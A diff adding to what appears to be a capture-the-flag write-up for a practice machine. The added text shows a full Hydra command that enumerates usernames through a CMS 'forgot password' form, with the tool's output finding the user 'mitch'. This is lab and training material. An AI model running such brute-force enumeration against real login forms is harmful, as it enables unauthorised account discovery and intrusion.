@@ -121,6 +121,21 @@ http://10.10.83.63:80/simple (Status: 301) [Size: 311]
 
 run sqlmap, does not appear to be injectable
 
+try to bruteforce the username using the forgot password form
+
+```
+kali@kali:~/Downloads$ hydra -L allnames.txt -p test 10.10.83.63 -t 4 http-form-post "/simple/admin/login.php?forgotpw=1:forgottenusername=^USER^&forgotpwform=1&loginsubmit=Submit:F=Found" 
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-07-27 04:54:31
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 8295455 login tries (l:8295455/p:1), ~2073864 tries per task
+[DATA] attacking http-post-form://10.10.83.63:80/simple/admin/login.php?forgotpw=1:forgottenusername=^USER^&forgotpwform=1&loginsubmit=Submit:F=Found
+[STATUS] 129.00 tries/min, 129 tries in 00:01h, 8295326 to do in 1071:45h, 4 active
+[STATUS] 130.00 tries/min, 390 tries in 00:03h, 8295065 to do in 1063:29h, 4 active
+[STATUS] 132.14 tries/min, 925 tries in 00:07h, 8294530 to do in 1046:10h, 4 active
+[80][http-post-form] host: 10.10.83.63   login: mitch   password: test
+```
+
 ### Where can you login with the details obtained?
 
 ### What's the user flag?
